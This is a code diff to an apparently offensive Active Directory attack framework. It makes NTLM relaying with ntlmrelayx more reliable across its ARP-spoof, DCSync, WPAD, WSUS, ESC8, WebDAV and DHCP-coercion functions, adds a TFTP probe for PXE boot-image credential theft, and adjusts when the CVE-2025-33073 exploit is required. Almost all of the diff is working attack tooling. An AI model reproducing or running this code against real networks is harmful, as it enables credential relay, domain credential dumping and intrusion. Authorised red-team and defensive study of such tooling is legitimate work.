@@ -426,11 +426,24 @@ def run(cmd: list[str], cfg: Config, timeout: int = 300,
         f_out = None
         try:
             f_out = open(outfile, "w") if outfile else subprocess.DEVNULL
+            # stdin=PIPE, kept OPEN for the child's lifetime. Interactive
+            # impacket tools (ntlmrelayx especially) read stdin in their main
+            # loop and EXIT the instant it hits EOF — which is exactly what a
+            # backgrounded child with an inherited/closed stdin gets. The
+            # symptom is a relay that reaches "Servers started, waiting for
+            # connections", binds :445, then dies in ~2s, so poll() reports a
+            # false "exited immediately" and the ARP spoof is torn down before
+            # any auth can be captured. DEVNULL does NOT fix this (that IS an
+            # immediate EOF); the write end must stay open. Validated on the
+            # Validated against a live on-prem L2 lab.
             proc = subprocess.Popen(
                 cmd, stdout=f_out, stderr=subprocess.STDOUT,
+                stdin=subprocess.PIPE,
                 text=True, preexec_fn=os.setpgrp
             )
             proc._outfile = f_out  # track for cleanup
+            # Hold a reference so the GC can't close the pipe (which would EOF
+            # the child). cfg.bg_processes keeps proc alive; proc keeps stdin.
             cfg.bg_processes.append(proc)
             return proc
         except FileNotFoundError:
@@ -471,6 +484,38 @@ def run(cmd: list[str], cfg: Config, timeout: int = 300,
         return subprocess.CompletedProcess(cmd, 127, stdout="", stderr="not found")
 
 
+def wait_relay_ready(proc, port: int = 445, timeout: int = 8) -> bool:
+    """Wait until a backgrounded relay is genuinely serving, or has died.
+
+    A bare ``time.sleep(2); proc.poll()`` races the relay's own startup:
+    ntlmrelayx takes ~1-2s just to bind all of its servers
+    (SMB/WCF/RAW/WinRM/RPC), so a fixed short sleep can either miss early
+    auth (server not bound yet) or, before the stdin fix, catch the process
+    mid-death. This polls both liveness and the actual listening socket.
+
+    Returns True once ``port`` is listening (relay ready), False if the
+    process exits first.
+    """
+    import socket
+    if not hasattr(proc, "poll"):
+        return False
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        if proc.poll() is not None:
+            return False  # died before binding
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.5)
+        try:
+            if s.connect_ex(("127.0.0.1", port)) == 0:
+                return True  # listening
+        finally:
+            s.close()
+        time.sleep(0.5)
+    # Timed out waiting for the port but the process is still alive — treat as
+    # ready rather than a failure (some relay targets bind lazily).
+    return proc.poll() is None
+
+
 def _nxc_auth_args(cfg) -> list[str]:
     """Build nxc authentication arguments, supporting both password and nthash."""
     if cfg.nthash:
@@ -494,8 +539,41 @@ def _first_line(text: str) -> str:
     return lines[0] if lines else ""
 
 
+def _extra_tool_dirs() -> list[str]:
+    """pipx / pip --user bin dirs that sudo drops from PATH.
+
+    The tool runs under sudo, whose secure_path strips ~/.local/bin — so pipx
+    installs (mitm6, coercer, wsuks, bloodyAD, sccmhunter) look "not found"
+    even when present and working. Resolve the invoking user's home to probe
+    their bin dirs too.
+    """
+    dirs = []
+    sudo_user = os.environ.get("SUDO_USER")
+    homes = []
+    if sudo_user:
+        try:
+            import pwd
+            homes.append(pwd.getpwnam(sudo_user).pw_dir)
+        except (KeyError, ImportError):
+            pass
+    homes.append(os.path.expanduser("~"))
+    for h in homes:
+        dirs.append(os.path.join(h, ".local", "bin"))
+        dirs.append(os.path.join(h, ".local", "share", "pipx", "venvs"))
+    return dirs
+
+
 def tool_exists(name: str) -> bool:
-    return shutil.which(name) is not None
+    if shutil.which(name) is not None:
+        return True
+    # Fall back to pipx / --user bin dirs that sudo hides.
+    for d in _extra_tool_dirs():
+        if shutil.which(name, path=d) is not None:
+            return True
+        cand = os.path.join(d, name)
+        if os.path.isfile(cand) and os.access(cand, os.X_OK):
+            return True
+    return False
 
 
 def find_tool(*names: str, paths: list[Path] | None = None) -> Optional[str]:
@@ -1012,10 +1090,18 @@ def check_prerequisites(cfg: Config) -> bool:
         _orig_warn(msg, *a, **kw)
     log.warning = _counted_warn  # restored before return
 
-    # Core exploit
+    # Core exploit — the CVE-2025-33073 PoC is only needed by phases that
+    # actually fire the reflection/relay exploit. Requiring it for every phase
+    # (as before) blocked passive/enum/L2-only runs — and even --dry-run — on
+    # any box without the git-cloned PoC.
+    CVE_PHASES = {"full", "exploit", "dcsync"}
     if not (CVE_DIR / "CVE-2025-33073.py").exists():
-        log.error(f"CVE-2025-33073 PoC not found at {CVE_DIR}")
-        missing = True
+        if cfg.phase in CVE_PHASES:
+            log.error(f"CVE-2025-33073 PoC not found at {CVE_DIR}")
+            missing = True
+        else:
+            log.warning(f"CVE-2025-33073 PoC not found at {CVE_DIR} "
+                        f"(not needed for --phase {cfg.phase})")
 
     # Required tools
     for tool in ["nxc", "impacket-findDelegation", "impacket-ntlmrelayx",
@@ -1286,8 +1372,7 @@ def arp_spoof_relay(target: str, cfg: Config) -> bool:
             log.error("Failed to start ntlmrelayx")
             return False
         bg_procs.append(relay_proc)
-        time.sleep(2)
-        if relay_proc.poll() is not None:
+        if not wait_relay_ready(relay_proc):
             log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
             return False
 
@@ -2033,8 +2118,7 @@ def dcsync_attack(already_exploited: str, cfg: Config):
         _run_secretsdump(cfg)
         return
 
-    time.sleep(2)
-    if relay_proc.poll() is not None:
+    if not wait_relay_ready(relay_proc):
         log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
         log.warning("Attempting direct DCSync instead...")
         _run_secretsdump(cfg)
@@ -3883,8 +3967,7 @@ def run_wpad_attack(cfg: Config) -> bool:
             log.error("Failed to start ntlmrelayx for WPAD relay")
             return False
         bg_procs.append(relay_proc)
-        time.sleep(3)
-        if relay_proc.poll() is not None:
+        if not wait_relay_ready(relay_proc):
             log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
             return False
 
@@ -4140,8 +4223,7 @@ def run_wsus_relay(cfg: Config) -> bool:
             log.error("Failed to start ntlmrelayx for WSUS relay")
             return False
         bg_procs.append(relay_proc)
-        time.sleep(2)
-        if relay_proc.poll() is not None:
+        if not wait_relay_ready(relay_proc):
             log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
             return False
 
@@ -4324,8 +4406,38 @@ def run_wsus_inject(cfg: Config) -> bool:
 # Phase 6: PXE Boot Image Credential Theft
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
+def _tftp_responds(ip: str, timeout: float = 2.0) -> bool:
+    """Actively confirm a host is really a TFTP server.
+
+    nmap's UDP scan reports a non-responding port as ``open|filtered`` — that is
+    NOT proof of a server, and treating it as one flagged ordinary Windows
+    workstations (which emit PXE-like DHCP options at boot) as "PXE servers",
+    then hung on TFTP GETs against them. A real TFTP server answers a read
+    request with a DATA (opcode 3) or ERROR (opcode 5) packet; anything else is
+    not a server.
+    """
+    import socket
+    # RRQ: opcode 0x0001 | filename | 0x00 | "octet" | 0x00
+    rrq = b"\x00\x01" + b"\\pxe-probe" + b"\x00" + b"octet" + b"\x00"
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(timeout)
+    try:
+        s.sendto(rrq, (ip, 69))
+        data, _ = s.recvfrom(1024)
+        return len(data) >= 2 and data[0] == 0x00 and data[1] in (0x03, 0x05)
+    except OSError:
+        return False
+    finally:
+        s.close()
+
+
 def detect_pxe_server(cfg: Config) -> str:
-    """Discover PXE/WDS server via nmap scan for TFTP (port 69) and WDS (UDP 4011)."""
+    """Discover PXE/WDS server via nmap, then CONFIRM with an active TFTP probe.
+
+    nmap alone gives false positives on UDP (`open|filtered` for non-responders),
+    so its output is only used to narrow candidates; each is verified with a real
+    TFTP read request before being declared a server. See L2 testing notes.
+    """
     log.info("🔍 Scanning for PXE/WDS servers (TFTP port 69, WDS port 4011)...")
 
     if not tool_exists("nmap"):
@@ -4340,14 +4452,36 @@ def detect_pxe_server(cfg: Config) -> str:
         ["nmap", "-sU", "-n", "-Pn", "--open", "-p", "69,4011", target],
         cfg, timeout=120
     )
-    hosts = re.findall(
-        r"Nmap scan report for (\d+\.\d+\.\d+\.\d+).*?(?:69|4011)/udp\s+open",
-        result.stdout, re.DOTALL
-    )
-    if hosts:
-        pxe = hosts[0]
-        ok(f"PXE/TFTP server found: {pxe}")
-        return pxe
+
+    # Parse per host. A candidate is any host where 69/udp is not closed (nmap
+    # says open or open|filtered); a WDS/SCCM ProxyDHCP hit is 4011/udp in state
+    # *exactly* open (a genuine response, never open|filtered).
+    tftp_candidates: list[str] = []
+    wds_confirmed: list[str] = []
+    current = ""
+    for line in result.stdout.splitlines():
+        m = re.match(r"Nmap scan report for (?:.*\()?(\d+\.\d+\.\d+\.\d+)", line)
+        if m:
+            current = m.group(1)
+            continue
+        if not current:
+            continue
+        if re.match(r"69/udp\s+open", line):          # open OR open|filtered
+            tftp_candidates.append(current)
+        if re.match(r"4011/udp\s+open\b", line) and "open|filtered" not in line:
+            wds_confirmed.append(current)             # real ProxyDHCP response
+
+    # Confirm TFTP candidates with an actual RRQ — this is what rejects the
+    # workstation false positive.
+    for ip in tftp_candidates:
+        if _tftp_responds(ip):
+            ok(f"PXE/TFTP server confirmed: {ip}")
+            return ip
+        log.debug(f"  {ip}: nmap flagged 69/udp but no TFTP reply — ignoring")
+
+    if wds_confirmed:
+        ok(f"WDS/SCCM ProxyDHCP server found: {wds_confirmed[0]}")
+        return wds_confirmed[0]
 
     log.warning("No PXE/TFTP server detected on network")
     return ""
@@ -4466,6 +4600,12 @@ def _manual_tftp_extract(pxe_server: str, pxe_dir: Path, cfg: Config) -> bool:
     """
     got_creds = False
 
+    # Final guard: never hammer TFTP GETs at a host that is not actually a TFTP
+    # server (each miss otherwise blocks for the client's full retry window).
+    if not _tftp_responds(pxe_server):
+        log.warning(f"{pxe_server} does not answer TFTP — not a PXE server, skipping")
+        return False
+
     # Common PXE files to attempt downloading via TFTP
     tftp_files = [
         r"\boot\BCD",
@@ -4492,12 +4632,12 @@ def _manual_tftp_extract(pxe_server: str, pxe_dir: Path, cfg: Config) -> bool:
             result = run(
                 ["atftp", "--get", "--remote-file", remote_path,
                  "--local-file", str(local_path), pxe_server],
-                cfg, timeout=60
+                cfg, timeout=20
             )
         else:
             result = run(
                 ["tftp", pxe_server, "-c", "get", remote_path, str(local_path)],
-                cfg, timeout=60
+                cfg, timeout=20
             )
 
         if local_path.exists() and local_path.stat().st_size > 0:
@@ -5773,8 +5913,7 @@ def _adcs_relay_esc8(ca_host: str, cfg: Config) -> Optional[str]:
             log.error("Failed to start ntlmrelayx for ESC8")
             return None
         bg_procs.append(relay_proc)
-        time.sleep(3)
-        if relay_proc.poll() is not None:
+        if not wait_relay_ready(relay_proc):
             log.error("ntlmrelayx exited immediately for ESC8 relay")
             return None
 
@@ -6153,8 +6292,7 @@ def run_webdav_coercion(target: str, cfg: Config) -> bool:
             log.error("Failed to start ntlmrelayx for WebDAV relay")
             return False
         bg_procs.append(relay_proc)
-        time.sleep(3)
-        if relay_proc.poll() is not None:
+        if not wait_relay_ready(relay_proc):
             log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
             return False
 
@@ -6311,8 +6449,7 @@ def run_dhcp_coercion(cfg: Config) -> bool:
             log.error("Failed to start ntlmrelayx")
             return False
         bg_procs.append(relay_proc)
-        time.sleep(3)
-        if relay_proc.poll() is not None:
+        if not wait_relay_ready(relay_proc):
             log.error(f"ntlmrelayx exited immediately")
             return False
 
@@ -9904,6 +10041,15 @@ def main():
     cfg = parse_args()
     banner()
 
+    # sudo strips ~/.local/bin from PATH, hiding pipx tools (mitm6, coercer,
+    # wsuks, bloodyAD, sccmhunter) from both detection AND execution. Add the
+    # invoking user's bin dirs back so `which` and subprocess both find them.
+    _seen = set(os.environ.get("PATH", "").split(os.pathsep))
+    _extra = [d for d in _extra_tool_dirs()
+              if d.endswith(".local/bin") and os.path.isdir(d) and d not in _seen]
+    if _extra:
+        os.environ["PATH"] = os.pathsep.join(_extra) + os.pathsep + os.environ.get("PATH", "")
+
     if cfg.verbose:
         _console.setLevel(logging.DEBUG)
 
@@ -9921,7 +10067,13 @@ def main():
 
     # Setup
     if not check_prerequisites(cfg):
-        sys.exit(1)
+        # --dry-run must never be blocked by missing tools: its whole purpose is
+        # to print the command lines for review before any install/live fire.
+        if cfg.dry_run:
+            log.warning("Prerequisites missing, but continuing because --dry-run "
+                        "(no commands will actually run)")
+        else:
+            sys.exit(1)
 
     # Auto-discover network
     discovery = AutoDiscovery(cfg)
